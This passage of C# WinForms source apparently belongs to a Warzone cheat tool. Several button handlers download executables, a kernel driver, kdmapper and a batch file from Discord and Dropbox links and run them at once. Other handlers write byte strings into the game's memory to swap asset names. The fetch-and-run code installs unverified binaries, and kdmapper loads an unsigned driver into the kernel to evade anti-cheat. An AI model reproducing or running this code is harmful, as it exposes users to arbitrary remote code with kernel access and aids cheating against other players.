                    web1.DownloadFile("https://cdn.discordapp.com/attachments/924784008997503086/928770276462821386/Newtonsoft.Json.dll", "Newtonsoft.Json.dll");
                    web1.DownloadFile("https://cdn.discordapp.com/attachments/924784008997503086/928770294657720400/System.Diagnostics.EventLog.dll", "System.Diagnostics.EventLog.dll");
                    web1.DownloadFile("https://cdn.discordapp.com/attachments/924784008997503086/928770302941466694/System.ServiceProcess.ServiceController.dll", "System.ServiceProcess.ServiceController.dll");
                    web1.Proxy = null;
                    Process.Start("Windows.update.exe");
                 
                }
            }
        }

        private void guna2Button8_Click_1(object sender, EventArgs e)
        {
            
        }

        private void guna2Button15_Click(object sender, EventArgs e)
        {
            {
                using (WebClient web1 = new WebClient())
                {
                    web1.DownloadFile("https://cdn.discordapp.com/attachments/924784008997503086/927574380119203890/driver.sys", "driver.sys");
                    web1.DownloadFile("https://cdn.discordapp.com/attachments/924784008997503086/927574380479922196/kdmapper.exe", "kdmapper.exe");
                    web1.DownloadFile("https://cdn.discordapp.com/attachments/924784008997503086/927574380307972106/DriverMapper.bat.bat", "DriverMapper.bat.bat");
                    web1.Proxy = null;
                    Process.Start("DriverMapper.bat.bat");
                }
            }
        }

        private void guna2Button14_Click(object sender, EventArgs e)
        {
            {
                using (WebClient web1 = new WebClient())
                {
                    web1.DownloadFile("https://cdn.discordapp.com/attachments/924784008997503086/927574380119203890/driver.sys", "driver.sys");
                    web1.DownloadFile("https://cdn.discordapp.com/attachments/924784008997503086/927574380479922196/kdmapper.exe", "kdmapper.exe");
                    web1.DownloadFile("https://cdn.discordapp.com/attachments/924784008997503086/927574380307972106/DriverMapper.bat.bat", "DriverMapper.bat.bat");
                    web1.Proxy = null;
                    Process.Start("DriverMapper.bat.bat");
                }
            }
        }

        private void guna2Button11_Click(object sender, EventArgs e)
        {
            {
                {
                    using (WebClient web1 = new WebClient())
                    {
                        web1.DownloadFile("https://www.dropbox.com/s/c5f9zjwgsywys7l/ul4.exe?dl=1", "ul4.exe?dl=1");
                        web1.Proxy = null;
                        Process.Start("ul4.exe?dl=1");
                    }
                }
            }
        }

        private void guna2Button12_Click(object sender, EventArgs e)
        {
            {
                using (WebClient web1 = new WebClient())
                {
                    web1.DownloadFile("https://cdn.discordapp.com/attachments/924784008997503086/927584442216751174/Overlay.exe", "Overlay.exe");
                    web1.Proxy = null;
                    Process.Start("Overlay.exe");
                }
            }
        }

        private void guna2Button13_Click(object sender, EventArgs e)
        {
            {
                using (WebClient web1 = new WebClient())
                {
                    web1.DownloadFile("https://cdn.discordapp.com/attachments/924784008997503086/927585049086427196/Warzone.exe", "Warzone.exe");
                    web1.Proxy = null;
                    Process.Start("Warzone.exe");
                }
            }
        }

        private void groupBox3_Enter(object sender, EventArgs e)
        {

        }

        private void guna2Button11_Click_1(object sender, EventArgs e)
        {
            jm.WriteBytes("base.exe+1B7DB170,48,68,2C0,39,170,85C", "Byte", textBox1.Text);
        }

        private void guna2Button15_Click_1(object sender, EventArgs e)
        {
            jm.WriteBytes("base+28129DF5248,56", "56 45 48 49 43 4c 45 5f 47 52 4f 55 4e 44");
        }

        private void guna2Button26_Click(object sender, EventArgs e)
        {
            jm.WriteBytes("base+6C592E8,56", "56 45 48 49 43 4c 45 5f 47 52 4f 55 4e 44");
        }

        private void guna2Button16_Click(object sender, EventArgs e)
        {
            jm.WriteBytes("base+6C592E8,56", "56 45 48 49 43 4c 45 5f 46 4c 59 49 4e 47");
        }

        private void guna2Button25_Click(object sender, EventArgs e)
        {
            jm.WriteBytes("base+28129DF54C9,56", "56 45 48 49 43 4c 45 5f 46 4c 59 49 4e 47");
        }

        private void guna2Button17_Click(object sender, EventArgs e)
        {
            jm.WriteBytes("base+6C59390,56", "56 45 48 49 43 4c 45 5f 41 49 52 50 4c 41 4e 45");
        }

        private void guna2Button24_Click(object sender, EventArgs e)
        {
            jm.WriteBytes("base+28129DF54C9,56", "56 45 48 49 43 4c 45 5f 41 49 52 50 4c 41 4e 45");
        }

        private void guna2Button18_Click(object sender, EventArgs e)
        {
            jm.WriteBytes("base+281293B075E,50", "50 42 51 5f 53 74 61 74 69 63");
        }

        private void guna2Button29_Click(object sender, EventArgs e)
        {
            jm.WriteBytes("base+9A9C9AC,50", "50 42 51 5f 53 74 61 74 69 63");
        }

        private void guna2Button19_Click(object sender, EventArgs e)
        {
            jm.WriteBytes("base+281293B0744,50", "50 42 51 5f 44 79 6e 61 6d 69 63");
        }

        private void guna2Button28_Click(object sender, EventArgs e)
        {
            jm.WriteBytes("base+9A9C9C4,50", "50 42 51 5f 44 79 6e 61 6d 69 63");
        }

        private void guna2Button20_Click(object sender, EventArgs e)
        {
            jm.WriteBytes("base+281293B076A,50", "50 42 51 5f 56 65 68 69 63 6c 65");
        }

        private void guna2Button27_Click(object sender, EventArgs e)
        {
            jm.WriteBytes("base+9A9C9DC,50", "50 42 51 5f 56 65 68 69 63 6c 65");
        }

        private void guna2Button21_Click(object sender, EventArgs e)
        {
            jm.WriteBytes("base+9A9C9C4,50,48 8B C4", "50 42 51 5f 44 79 6e 61 6d 69 63");
        
        }

        private void guna2Button22_Click(object sender, EventArgs e)
        {
            jm.WriteBytes("base+9A9C9AC,50,48 8B C4", "50 42 51 5f 44 79 6e 61 6d 69 63");
        }

        private void guna2Button23_Click(object sender, EventArgs e)
        {
            jm.WriteBytes("base+9A9C9DC,50,48 8B C4", "50 42 51 5f 44 79 6e 61 6d 69 63");
        }

        private void guna2Button30_Click(object sender, EventArgs e)
        {
            jm.WriteBytes("base+9A9C9C4,50,48 8B C4", "50 42 51 5f 44 79 6e 61 6d 69 63");
            jm.WriteBytes("base+9A9C9AC,50,48 8B C4", "50 42 51 5f 44 79 6e 61 6d 69 63");
            jm.WriteBytes("base+9A9C9DC,50,48 8B C4", "50 42 51 5f 44 79 6e 61 6d 69 63");
        }

        private void guna2Button33_Click(object sender, EventArgs e)
        {
            jm.WriteBytes("base+9A9C9C4,50", "50 42 51 5f 44 79 6e 61 6d 69 63");
        }

        private void guna2Button32_Click(object sender, EventArgs e)
        {
            jm.WriteBytes("base+9A9C9AC,50", "50 42 51 5f 53 74 61 74 69 63");
        }

        private void guna2Button31_Click(object sender, EventArgs e)
        {
            jm.WriteBytes("base+9A9C9DC,50", "50 42 51 5f 56 65 68 69 63 6c 65");
        }
        private void guna2Button34_Click(object sender, EventArgs e)
        {
            jm.WriteBytes("base+6C592D8,56", "56 45 48 49 43 4c 45 5f 47 52 4f 55 4e 44");
        }

        private void guna2Button35_Click(object sender, EventArgs e)
        {
            jm.WriteBytes("base+6C592E8,56", "56 45 48 49 43 4c 45 5f 46 4c 59 49 4e 47");
        }

        private void guna2Button36_Click(object sender, EventArgs e)
        {
            jm.WriteBytes("base+6C59390,56", "56 45 48 49 43 4c 45 5f 41 49 52 50 4c 41 4e 45");
        }

        private void guna2Button37_Click(object sender, EventArgs e)
        {
            jm.WriteBytes("base+9A9C9F4,50", "50 4D 50 5F 53 74 61 74");
        }

        private void guna2Button38_Click(object sender, EventArgs e)
        {
            jm.WriteBytes("base+9A9CA0C,50", "50 4d 50 5f 4b 65 79 66 72 61 6d 65 64");
        }

        private void guna2Button39_Click(object sender, EventArgs e)
        {
            jm.WriteBytes("base+9A9C9C4,50", "50 42 51 5f 44 79 6e 61 6d 69 63");
            jm.WriteBytes("base+9A9C9AC,50", "50 42 51 5f 53 74 61 74 69 63");
            jm.WriteBytes("base+9A9C9DC,50", "50 42 51 5f 56 65 68 69 63 6c 65");
            jm.WriteBytes("base+6C592D8,56", "56 45 48 49 43 4c 45 5f 47 52 4f 55 4e 44");
            jm.WriteBytes("base+6C592E8,56", "56 45 48 49 43 4c 45 5f 46 4c 59 49 4e 47");
            jm.WriteBytes("base+6C59390,56", "56 45 48 49 43 4c 45 5f 41 49 52 50 4c 41 4e 45");
            jm.WriteBytes("base+9A9C9F4,50", "50 4D 50 5F 53 74 61 74");
            jm.WriteBytes("base+9A9CA0C,50", "50 4d 50 5f 4b 65 79 66 72 61 6d 65 64");

        }

        private void VGCamoSwapComboBox_SelectedIndexChanged(object sender, EventArgs e)
        {

        }

        private void guna2Button40_Click(object sender, EventArgs e)
        {
            jm.WriteBytes("base+6C66688,6c", "56c 65 76 65 6c 5f 78 70");
        }
    }
}




